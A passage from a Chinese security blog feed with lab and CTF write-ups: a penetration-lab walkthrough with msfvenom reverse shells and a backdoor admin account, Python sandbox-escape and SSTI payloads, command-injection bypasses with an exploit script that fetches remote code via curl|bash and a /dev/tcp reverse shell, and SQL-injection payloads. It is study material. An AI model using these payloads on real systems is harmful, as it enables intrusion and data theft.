    <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验拓扑如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/12fff649/1583830717716.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/12fff649/1583830733667.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;任务一-
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>企业环境渗透2</title>
    <link href="http://prontosil.com/posts/c08799e1/"/>
    <id>http://prontosil.com/posts/c08799e1/</id>
    <published>2020-03-10T07:47:54.000Z</published>
    <updated>2020-03-10T08:37:26.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>weblogic介绍</p><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞(不能复制粘贴好难受)</p><p><img src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务一-weblogic反序列化&quot;&gt;&lt;a href=&quot;#任务一-weblogic反序列化&quot; class=&quot;headerlink&quot; title=&quot;任务一 weblogic反序列化&quot;&gt;&lt;/a&gt;任务一 weblogic反序列化&lt;/h2&gt;&lt;p&gt;weblogic介绍&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>python沙盒逃逸</title>
    <link href="http://prontosil.com/posts/ed9dc04e/"/>
    <id>http://prontosil.com/posts/ed9dc04e/</id>
    <published>2020-03-10T07:19:07.000Z</published>
    <updated>2020-03-18T07:41:50.169Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>两个重要的类，一般都会用到</p><pre><code class="python">In [44]: object.__subclasses__()[59]Out[44]: warnings.catch_warningsIn [45]: object.__subclasses__()[40]Out[45]: file</code></pre><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code class="python">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</code></pre><p>如图</p><p><img src="/posts/ed9dc04e/1582442823657.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].getlines(&#39;/etc/passwd&#39;)</code></pre><p><img src="/posts/ed9dc04e/1582444265686.png" alt></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="python">().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</code></pre><p><img src="/posts/ed9dc04e/1582443624642.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s&#39;).read()#也可以写成().__class__.__bases__[.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;ls&#39;).read()# 等价于object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</code></pre><p><img src="/posts/ed9dc04e/1582446827696.png" alt></p><p>可以使用 <code>__getattribute__</code> 获得属性， <code>__dict__</code></p><p>寻找可以利用的模块</p><pre><code class="python">search = &#39;os&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass &#39;&#39;&#39;(&lt;class &#39;site._Printer&#39;&gt;, 71)(&lt;class &#39;site.Quitter&#39;&gt;, 76)(&lt;class &#39;socket._socketobject&#39;&gt;, 124)...&#39;&#39;&#39;</code></pre><p>比如</p><p><img src="/posts/ed9dc04e/1582443247342.png" alt></p><p>来自其他师傅的</p><pre><code class="python">object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="py2和3通吃"><a href="#py2和3通吃" class="headerlink" title="py2和3通吃"></a>py2和3通吃</h2><pre><code class="python">search = &#39;__builtins__&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass </code></pre><p>python2 举例</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582446435900.png" alt></p><p>python3</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582443435704.png" alt></p><h2 id="python3-读文件"><a href="#python3-读文件" class="headerlink" title="python3 读文件"></a>python3 读文件</h2><pre><code class="python">In [64]: &quot;&quot;.__class__.__bases__[0].__subclasses__()[127]Out[64]: os._wrap_close&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;cat /etc/&#39;+&#39;passwd&#39;).read()</code></pre><p>i春秋比赛的一道题的payload</p><pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}# waf 拦截了 popen 和 flag</code></pre><h2 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h2><p>常用的</p><pre><code class="python">{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code></pre><h3 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h3><p> 这个对象指的是当前请求对象，<code>request.environ</code>对象是一个与服务器环境相关的对象字典。值得一提的是，可以通过访问<code>request.args.get</code> <code>request.cookies</code> <code>request.headers</code>等访问我们的请求参数，这主要是用来绕过过滤。（比如不让输入某关键字，我们就可以通过cookies传入，然后从request.cookies获取即可）</p><h3 id="config对象"><a href="#config对象" class="headerlink" title="config对象"></a>config对象</h3><p> config对象是当前配置对象，是一个类字典的对象，可以用<code>config.items()</code>来访问。而且它还有一些独特1的方法，<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code> 。<code>from_pyfile</code>可以读取指定python文件编译并加载进来。</p><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>使用内置过滤器来绕过</p><p><code>{{request|attr("get")}}</code> 相当于 <code>{{request.get}}</code></p><p>结合 <code>join</code> 过滤器可以拼接字符，于是：</p><p><code>{{request|attr(["_"*2,"class","_"*2]|join)}}</code>相当于<code>{{request.__class__}}</code></p><p>不过我们可以通过<code>request.cookies[&#39;var&#39;]</code> 来进行获取</p><h3 id="使用-获得对象属性"><a href="#使用-获得对象属性" class="headerlink" title="使用 [] 获得对象属性"></a>使用 <code>[]</code> 获得对象属性</h3><p><code>{{''.__class__}} = {{''['__cl'+'ass__']}}</code></p><h3 id="限制输入-和"><a href="#限制输入-和" class="headerlink" title="限制输入 [和]"></a>限制输入 <code>[</code>和<code>]</code></h3><p><code>{{request.cookies.getitem("hh")}}</code></p><h2 id="tornado-SSTI"><a href="#tornado-SSTI" class="headerlink" title="tornado SSTI"></a>tornado SSTI</h2><p>护网杯2018的一道题</p><p><img src="/posts/ed9dc04e/1582507995702.png" alt></p><p>然后我们通过 <code>{{handler.settings}}</code>来获得 cookie_secret</p><p><img src="/posts/ed9dc04e/1582508041772.png" alt></p><p>最后得到 flag</p><pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre><h2 id="校赛一道flask-SSTI题"><a href="#校赛一道flask-SSTI题" class="headerlink" title="校赛一道flask SSTI题"></a>校赛一道flask SSTI题</h2><p>有一个正则过滤了</p><p><img src="/posts/ed9dc04e/0-1584517174812.png" alt></p><p>绕过，得到密钥</p><p><img src="/posts/ed9dc04e/0.png" alt></p><p>之后伪造cookie</p><p><img src="/posts/ed9dc04e/0-1584517209079.png" alt></p><p>之后得到flag</p><p><img src="/posts/ed9dc04e/0-1584517225387.png" alt></p><h2 id="新春战疫-python3"><a href="#新春战疫-python3" class="headerlink" title="新春战疫(python3)"></a>新春战疫(python3)</h2><p>这题主要就是不清楚python3的构造，找了很久才找到一个可以利用的类</p><p>payload如下：</p><pre><code>{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.szfszf.top/article/16/" target="_blank" rel="noopener">https://blog.szfszf.top/article/16/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python2&quot;&gt;&lt;a href=&quot;#python2&quot; class=&quot;headerlink&quot; title=&quot;python2&quot;&gt;&lt;/a&gt;python2&lt;/h2&gt;&lt;p&gt;两个重要的类，一般都会用到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;In [44
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="python" scheme="http://prontosil.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>命令执行绕过技巧</title>
    <link href="http://prontosil.com/posts/58281de6/"/>
    <id>http://prontosil.com/posts/58281de6/</id>
    <published>2020-03-10T07:17:49.000Z</published>
    <updated>2020-03-10T07:19:48.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tar命令绕过"><a href="#tar命令绕过" class="headerlink" title="tar命令绕过"></a>tar命令绕过</h2><p>最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题就可以这样非预期</p><pre><code>?ip=1;tar$IFS$9-cvf$IFS$9index$IFS$9.</code></pre><p><img src="/posts/58281de6/1582542493140.png" alt></p><h2 id="Windows命令执行"><a href="#Windows命令执行" class="headerlink" title="Windows命令执行"></a>Windows命令执行</h2><pre><code class="php">&lt;?php$a = &quot;../ %1a whoami&quot;;$command = &#39;dir &#39;.urldecode($a);$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&#39;out.bat&#39;,$escaped_command);system(&#39;out.bat&#39;);?&gt;</code></pre><img src="/posts/58281de6/2020/PersonNote/CTF笔记/命令执行绕过技巧/1581933022683.png" style="zoom:50%;"><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><pre><code>|||&amp;&amp;;</code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><pre><code>~ ᐅ cat&lt;&gt;flag     flag{fffffffffff}~ ᐅ cat&lt;flag flag{fffffffffff}</code></pre><p><code>${IFS}</code> </p><p>这算是Linux中的一个变量</p><blockquote><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><pre><code>~ ᐅ echo ${IFS} &gt; aa.txt~ ᐅ xxd aa.txt 00000000: 2009 0a00 0a                              ....//用python读取一下&gt;&gt;&gt; f = open(&quot;aa.txt&quot;)&gt;&gt;&gt; f.readlines()[&#39; \t\n&#39;, &#39;\x00\n&#39;]</code></pre><p>使用 <code>${IFS}</code> 绕过(但是我没有实验成功)  ==只适用于Ubuntu==</p><pre><code class="bash">ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>有些时候会设置一些关键字过滤(比如设置flag)</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><pre><code>~ ᐅ a=c;b=at;c=flag;$a$b $cflag{fffffffffff}</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><pre><code>~ ᐅ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashflag{fffffffffff}</code></pre><h3 id="单引号双引号"><a href="#单引号双引号" class="headerlink" title="单引号双引号"></a>单引号双引号</h3><pre><code class="bash">~ ᐅ c&quot;&quot;at flagflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&quot;&quot;agflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&#39;&#39;agflag{fffffffffff}</code></pre><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><pre><code>~ ᐅ c\at fl\agflag{fffffffffff}</code></pre><h2 id="绕过长度的限制"><a href="#绕过长度的限制" class="headerlink" title="绕过长度的限制"></a>绕过长度的限制</h2><p>原题</p><pre><code class="php">&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);</code></pre><p>Linux 可以通过 <code>\</code> 换行</p><p><code>sh filename</code> 可以执行一个shell脚本，如果有报错的话会自动跳过</p><p><code>&gt;</code> 会覆盖原有的内容</p><p><code>&gt;&gt;</code> 是追加内容</p><p>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a></p><p><img src="/posts/58281de6/1582539212357.png" alt></p><p>最后的exp</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import quotepayload = [    # generate `ls -t&gt;g` file    &#39;&gt;ls\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;-t\\&#39;,     &#39;&gt;\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,     # generate `curl orange.tw.tw|python`    # generate `curl 10.188.2.20|bash`     &#39;&gt;sh\ &#39;,     &#39;&gt;ba\\&#39;,     &#39;&gt;\|\\&#39;,    &#39;&gt;20\\&#39;,    &#39;&gt;2.\\&#39;,     &#39;&gt;8.\\&#39;,    &#39;&gt;18\\&#39;,     &#39;&gt;0.\\&#39;,     &#39;&gt;1\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # exec    &#39;sh _&#39;,     &#39;sh g&#39;, ]r = requests.get(&#39;http://10.188.2.20:22460/?reset=1&#39;)for i in payload:    assert len(i) &lt;= 5     r = requests.get(&#39;http://10.188.2.20:22460/?cmd=&#39; + quote(i) )    print i    sleep(0.2)</code></pre><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">Dockerfile</a></p><h2 id="绕过长度为4的限制"><a href="#绕过长度为4的限制" class="headerlink" title="绕过长度为4的限制"></a>绕过长度为4的限制</h2><p>。。太狠了</p><h2 id="绕过长度限制写shell"><a href="#绕过长度限制写shell" class="headerlink" title="绕过长度限制写shell"></a>绕过长度限制写shell</h2><p><img src="/posts/58281de6/1582540869115.png" alt></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>gitlist远程命令执行漏洞</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>复现：</p><p>这里的问题出在单引号并不能使得包裹的内容成为一个非选项</p><p><img src="/posts/58281de6/dd89dc70-2446-48e1-a728-5693d1fa868a.bbb0aaacef7d.png" alt></p><p>创建一个 <code>--name</code> 文件，但是无法直接用 cat进行读取，因为会被认为是一个选项，即使是用单引号包裹也不行</p><p>比如这个命令就不会执行，因为单引号包裹的内容放在 <code>-e</code> 选项的值中</p><pre><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master</code></pre><p><img src="/posts/58281de6/1582541083787.png" alt></p><p>必须是 <code>cat -- --name</code>, 从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><p>修复：</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;); //强制加入 -- 使得后面的成为参数的值    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>python中存在的漏洞点</p><pre><code class="python">import subprocessquery = &#39;id&#39;r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)</code></pre><p><img src="/posts/58281de6/8296bbd4-40cd-481e-9147-6f11e80967d8.6b4cdb17a1b8.png" alt></p><h2 id="eval长度限制绕过-amp-amp-PHP5-6新特性"><a href="#eval长度限制绕过-amp-amp-PHP5-6新特性" class="headerlink" title="eval长度限制绕过 &amp;&amp; PHP5.6新特性"></a>eval长度限制绕过 &amp;&amp; PHP5.6新特性</h2><pre><code class="php">&lt;?php$param = $_REQUEST[&#39;param&#39;];if(strlen($param)&lt;17 &amp;&amp; stripos($param,&#39;eval&#39;) === false &amp;&amp; stripos($param,&#39;assert&#39;) === false) {  eval($param);}?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>param=`$_GET[1]`;&amp;1=bash</code></pre><p>或者</p><pre><code>param=exec($_GET[1]);</code></pre><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p><p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><pre><code>param=$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p><p>除了<code>file_put_contents</code>，<code>error_log</code>函数效果也类似。</p><p>但是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>写shell的方法</p><pre><code># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw# 最后包含param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre><h4 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h4><pre><code>param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</code></pre><h3 id="标准答案，利用变长参数执行"><a href="#标准答案，利用变长参数执行" class="headerlink" title="标准答案，利用变长参数执行"></a>标准答案，利用变长参数执行</h3><pre><code>POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1Host: localhost:8081Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22param=usort(...$_GET);</code></pre><p><img src="/posts/58281de6/1582707944277.png" alt></p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">参考</a></p><p>一个坑</p><p>想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p><p>只有数字索引数组才能作为变长参数数组。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tar命令绕过&quot;&gt;&lt;a href=&quot;#tar命令绕过&quot; class=&quot;headerlink&quot; title=&quot;tar命令绕过&quot;&gt;&lt;/a&gt;tar命令绕过&lt;/h2&gt;&lt;p&gt;最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="命令执行" scheme="http://prontosil.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab记录</title>
    <link href="http://prontosil.com/posts/70df97a2/"/>
    <id>http://prontosil.com/posts/70df97a2/</id>
    <published>2020-03-10T07:14:56.000Z</published>
    <updated>2020-03-10T07:16:09.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一关-GET-Error-based-Single-quotes"><a href="#第一关-GET-Error-based-Single-quotes" class="headerlink" title="第一关 GET Error based- Single quotes"></a>第一关 GET Error based- Single quotes</h2><p>payload</p><pre><code>http://localhost/Less-1/?id=1&#39; order by 3 -- +</code></pre><p><img src="/posts/70df97a2/1581060199563.png" alt></p><p>(火狐不知道为什么感觉有bug)</p><p>在确定回显的时候，要注意去查一个不存在的数据</p><pre><code>http://localhost/Less-1/?id=888&#39; union select 1,2,3 --+</code></pre><h2 id="第二关-GET-Error-based-Intiger"><a href="#第二关-GET-Error-based-Intiger" class="headerlink" title="第二关 GET Error based-Intiger"></a>第二关 GET Error based-Intiger</h2><p>没有单引号保护</p><pre><code>http://localhost/Less-2/?id=12312 union select 1,2,3 #</code></pre><p><img src="/posts/70df97a2/1581060927106.png" alt></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>加了括号保护</p><pre><code class="sql">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre><pre><code>http://localhost/Less-3/?id=22333&#39; ) union select 1,2,3 --+</code></pre><p><img src="/posts/70df97a2/1581061220464.png" alt></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>双引号保护</p><pre><code>http://localhost/Less-4/?id=1111&quot;) union select 1,2,3--+</code></pre><p><img src="/posts/70df97a2/1581061432798.png" alt></p><h2 id="第五关-Double-injection-Single-Quotes"><a href="#第五关-Double-injection-Single-Quotes" class="headerlink" title="第五关  Double injection-Single Quotes"></a>第五关  Double injection-Single Quotes</h2><p>这里理解一下报错注入</p><pre><code class="sql">select count(*),(concat(floor(rand(0)*2),(select version())))x from users group by x</code></pre><p><code>floor(rand(0)*2)</code> 产生的数据很有规律</p><pre><code>mysql&gt; select 